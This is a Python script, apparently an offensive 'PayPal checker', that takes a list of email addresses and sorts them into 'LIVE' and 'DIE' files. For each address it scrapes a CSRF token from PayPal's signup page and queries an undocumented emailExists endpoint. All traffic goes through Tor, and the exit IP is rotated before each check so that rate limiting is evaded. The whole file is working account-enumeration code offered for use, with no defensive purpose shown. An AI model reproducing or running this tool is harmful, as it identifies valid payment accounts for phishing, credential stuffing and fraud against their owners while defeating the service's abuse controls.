import helper
import help1
import requests , re , os , sys
from datetime import datetime
from stem import Signal
from stem.control import Controller
import time
from fake_useragent import UserAgent

if sys.platform in ["linux","linux2"]:
	W = '\033[0m'
	G = '\033[32;1m'
	R = '\033[31;1m'
	
else:
	W = ''
	G = ''
	R = ''


print(G + '''
    ____              ____        __      ________    __  
   / __ \____ ___  __/ __ \____ _/ /     / ____/ /_  / /__
  / /_/ / __ `/ / / / /_/ / __ `/ /_____/ /   / __ \/ //_/
 / ____/ /_/ / /_/ / ____/ /_/ / /_____/ /___/ / / / ,<   
/_/    \__,_/\__, /_/    \__,_/_/      \____/_/ /_/_/|_|  
            /____/                                        
''')
print()
print(R + '[!] write the path of your list or if you have put your list in [list.txt] click ENTER !!'.title())

print(G + 'PATH :>> ' , end='' , flush=True)
inpt = input()

if inpt == '':
	filex = open('list.txt')

else:
	filex = open(inpt)

listemail = filex.read()

listax = listemail.split('\n')
Live = []
Die = []
print()

totlanumber = len(listax)
print(R + '[!]' , totlanumber  , 'emails will be checked'.title() )
def new_ip():
	with Controller.from_port(port=9051) as controller:
		controller.authenticate(password='0183686454')
		controller.signal(Signal.NEWNYM)



# new_ip()

##--------------------------------------------------##---------------------------------------------------##
##--------------------------------------------------##---------------------------------------------------##

def chk(email):
	global session
	# time.sleep(1)
	
	print(G + '[!] [%s/%s] CHECKING : '%(listax.index(email) + 1 , totlanumber - 1 ) + W + '[' +  email.strip() + ']'+' .... ' , end='' , flush=True)
	pattern = re.compile(r'"data-csrf-token="(\S+?)"')
	session = requests.session()
	session.cookies.clear()
	session.proxies = {'https' : 'socks5://127.0.0.1:9050'}
	# print(W + '[X] CHANGE YOUR IP TO : ', session.get("https://nghttp2.org/httpbin/ip").text[10:-2])
	header = {
		'Host': 'www.paypal.com',
	'Connection': 'close',
	'Upgrade-Insecure-Requests': '1',
	'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36',
	'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
	'Accept-Encoding': 'gzip, deflate',
	'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8'
	}

	
	# header = 
	# res0 = session.get('https://www.paypal.com' , headers=header)


	res = session.get('https://www.paypal.com/welcome/signup' , headers=header)

	# print(res.text)
	search = pattern.search(res.text)
	# print(res.text)
	if search:
		csrf = search.group(1)
		
	elif not search:
		pattern2 = re.compile(r'"_csrf":"(\S+?)"')
		search = pattern2.search(res.text)
		csrf = search.group(1)
		# print(csrf)

	# print(W + csrf)
	cookie = res.cookies.get_dict()
	# print(cookie)
	# session.headers['x-csrf-token'] = csrf

	header1 = {
		'Host': 'www.paypal.com',
	'Connection': 'close',
	# Content-Length: 33
	'Accept': 'application/json, text/plain, */*, application/json',
	'Origin': 'https://www.paypal.com',
	'x-csrf-token': csrf,
	'X-Requested-With': 'XMLHttpRequest',
	'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36',
	'Content-Type': 'application/json;charset=UTF-8',
	'Referer': 'https://www.paypal.com/welcome/signup/',
	'Accept-Encoding': 'gzip, deflate',
	'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8'

	}

	# cookie = {'htdebug':'','nsid':'s%3AZNX3zAZ6fIauFlck0UzAqeo5M8NFKTrk.aFG3U9uAyTTiZREazXuMctheIXtrlRVGMLlTdIpFZ04','AKDC':'phx-origin-www-2.paypal.com','cookie_check':'yes','44907':'','47364':'en_US','_ga':'GA1.2.769863504.1537215941','_gat_PayPal':'1','ts':'vreXpYrS%3D1631925044%26vteXpYrS%3D1537232444%26vr%3Dea14bd2c165ac1200016a0d8fffeea7f%26vt%3Dea14bd44165ac1200016a0d8fffeea7e','tsrce':'progressivenodeweb','x-pp-s':'eyJ0IjoiMTUzNzIzMDY0NDg3NiIsIm0iOiIwIn0','akavpau_ppsd':'1537231245~id=bbc198ffca5cbfd8fed3a79e26bb6b15','_gat_PayPalTest':'1',' KHcl0EuY7AKSMgfvHl7J5E7hPtK':'FRPJP9B06qexpBqdb5Sh3BHGM9-PQh-_8Ro5E4yK1dQNjTBmoysa547cCx_OCpZPMvoqUqYdgxAJ8DKl','_gat':'1','X-PP-SILOVER':'name%3DLIVE3.APIC.1%26silo_version%3D880%26app%3Driskclientmetadatapiserv_apic%26TIME%3D994549851%26HTTP_X_PP_AZ_LOCATOR%3Ddcg12.slc'}
	payload = '{"email":"%s"}' % (email)

	# print(cookie)
	# print(payload)
	# print(header1)
	res2 = session.post('https://www.paypal.com/welcome/rest/v1/emailExists' , cookies=cookie , data=payload , headers=header1)

	res2.raise_for_status()

	# print(W + res2.text)

	if 'emailExists":false' in res2.text:
		print(R +'[X] DIE')
		Die.append(email)
		
	elif 'emailExists":true' in res2.text:
		print(G + '[$] LIVE')
		Live.append(email)
	
	else:
		raise Exception('This is the error message.')


##--------------------------------------------------##---------------------------------------------------##
##--------------------------------------------------##---------------------------------------------------##



# new_ip()
# for i in listax:
# 	chk(i)
# 	time.sleep(3)
session2 = requests.session()
session2.proxies = {'https' : 'socks5://127.0.0.1:9050'}
x = session2.get("https://nghttp2.org/httpbin/ip").text[10:-2]
print(G + '[!] STARTING !!')
##--------------------------------------------------##---------------------------------------------------##
##--------------------------------------------------##---------------------------------------------------##


try:
	for i in listax:

		if i.isspace() or not i or '@' not in i or '.' not in i or ':' in i:
			continue

		
		# print(x)
		new_ip()
		x2 = session2.get("https://nghttp2.org/httpbin/ip").text[10:-2]
		# print(x2)
		while x == x2:
			x2 = session2.get("https://nghttp2.org/httpbin/ip").text[10:-2]
			new_ip()
			time.sleep(1)
			
		try:

			chk(i)
			# time.sleep(1)

		except:
			try:

				print(R + '[X] THERE IS AN ERROE')
				# time.sleep(1)
				new_ip()
				chk(i)
			except:
				print(R + '[X] THERE IS AN ERROE AGAIN , SKIPPING !!!')

				continue
		x = x2
except:
	print(R + '[X] THERE IS AN ERROE !! ... STOPPING !!')


##--------------------------------------------------##---------------------------------------------------##
##--------------------------------------------------##---------------------------------------------------##


os.makedirs('OUTPUT' , exist_ok=True)

Name = datetime.now()


file1 =  open(os.path.join('OUTPUT','Die%s' % (Name)) , 'w')
for i in Die:
	file1.write(i + '\n')
file1.close()

file2 = open(os.path.join('OUTPUT','Live%s' % (Name)) , 'a')
for i in Live:
	 
	file2.write(i + '\n')
file2.close()
print()
print(G + '[*] SAVING RESULTS IN [%s.txt]' % (Name))

##--------------------------------------------------##---------------------------------------------------##
##--------------------------------------------------##---------------------------------------------------##
